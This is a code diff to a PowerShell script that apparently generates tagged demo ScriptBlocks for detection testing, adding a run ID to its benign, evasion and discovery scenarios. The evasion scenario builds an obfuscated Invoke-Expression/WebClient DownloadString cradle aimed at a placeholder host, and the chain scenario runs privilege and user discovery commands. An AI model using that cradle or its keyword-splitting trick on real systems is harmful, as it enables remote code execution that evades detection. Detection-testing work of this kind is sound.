@@ -55,8 +55,10 @@ function New-MarkerScript {
     )
 
     return "`$RedDemoTag = $(Quote-PSString $Tag);`r`n" +
+        "`$RedDemoRunId = $(Quote-PSString ([guid]::NewGuid().ToString()));`r`n" +
         "`$RedDemoMarker = $(Quote-PSString $Marker);`r`n" +
         "Write-Output `$RedDemoTag;`r`n" +
+        "Write-Output `$RedDemoRunId;`r`n" +
         "Write-Output `$RedDemoMarker"
 }
 
@@ -117,13 +119,18 @@ function Invoke-BenignScenario {
 
     $tag1 = New-DemoTag "BENIGN"
     $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
+        "`$RedDemoRunId = $(Quote-PSString ([guid]::NewGuid().ToString()));`r`n" +
         "`$RedDemoProcess = Get-Process -Id `$PID | Select-Object -Property Id, ProcessName;`r`n" +
         "Write-Output `$RedDemoTag;`r`n" +
+        "Write-Output `$RedDemoRunId;`r`n" +
         "Write-Output `$RedDemoProcess"
     Invoke-DemoScriptBlock -Label "Benign inventory ScriptBlock" -ScriptText $script1
 
     $tag2 = New-DemoTag "BENIGN_SERVICE_CHECK"
     $script2 = "`$RedDemoTag = $(Quote-PSString $tag2);`r`n" +
+        "`$RedDemoRunId = $(Quote-PSString ([guid]::NewGuid().ToString()));`r`n" +
+        "Write-Output `$RedDemoTag;`r`n" +
+        "Write-Output `$RedDemoRunId;`r`n" +
         "Get-Service | Select-Object -First 3 -Property Name, Status | Out-String | Write-Output"
     Invoke-DemoScriptBlock -Label "Benign service check ScriptBlock" -ScriptText $script2
 }
@@ -143,12 +150,14 @@ function Invoke-EvasionScenario {
     $tag1 = New-DemoTag "EVASION_CONCAT"
     $newObjText = Join-Text @("New", "-", "Object")
     $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
+        "`$RedDemoRunId = $(Quote-PSString ([guid]::NewGuid().ToString()));`r`n" +
         "`$verb = 'Inv' + 'oke';`r`n" +
         "`$noun = 'Expression';`r`n" +
         "`$client = 'Net.' + 'WebClient';`r`n" +
         "`$method = 'Download' + 'String';`r`n" +
         "`$RedDemoMarker = `"`$verb-`$noun ($newObjText `$client).`$method('http://example.invalid/red-demo.ps1')`";`r`n" +
         "Write-Output `$RedDemoTag;`r`n" +
+        "Write-Output `$RedDemoRunId;`r`n" +
         "Write-Output `$RedDemoMarker"
     Invoke-DemoScriptBlock -Label "Variant 1: concatenated keywords" -ScriptText $script1 -PauseSeconds $SleepSeconds
 
@@ -181,6 +190,9 @@ function Invoke-ChainScenario {
 
     $tag1 = New-DemoTag "CHAIN_DISCOVERY"
     $script1 = "`$RedDemoTag = $(Quote-PSString $tag1);`r`n" +
+        "`$RedDemoRunId = $(Quote-PSString ([guid]::NewGuid().ToString()));`r`n" +
+        "Write-Output `$RedDemoTag;`r`n" +
+        "Write-Output `$RedDemoRunId;`r`n" +
         "whoami /priv | Out-String | Write-Output;`r`n" +
         "Get-LocalUser | Select-Object -First 3 | Out-String | Write-Output"
     Invoke-DemoScriptBlock -Label "Stage A: local discovery ScriptBlock" -ScriptText $script1 -PauseSeconds $SleepSeconds
